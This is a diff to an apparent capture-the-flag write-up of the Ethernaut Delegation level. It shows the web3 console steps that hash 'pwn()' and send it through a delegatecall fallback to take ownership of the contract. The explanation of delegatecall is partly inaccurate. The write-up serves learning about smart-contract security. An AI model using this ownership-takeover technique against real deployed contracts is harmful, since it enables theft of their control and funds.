@@ -52,19 +52,19 @@ In the fallback function there is calling some data from Delegate contract with 
 
 For this part form of hacking, we must call fallback() from Delegation contract to trigger vulnerability and it will call pwn() function from Delegate contract. In other saying, after created variable named pwn and encode it with **keccak256**, I am calling pwn() function with **msg.data** when I use ```sendTransaction``` method. The truth of the matter is that the delegatecall function returns a **storage value** from the called address, so when we call the pwn function, the contract will update us as the **new owner**.
 
-```shell
+```js
 await contract.owner()
 '0x73379d8B82Fda494ee59555f333DF7D44483fD58'
 ```
 
-```shell
+```js
 var pwn = web3.utils.keccak256("pwn()")
 ```
-```shell
+```js
 await contract.sendTransaction({data: pwn})
 ```
 
-```shell
+```js
 await contract.owner()
 '0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
 ```
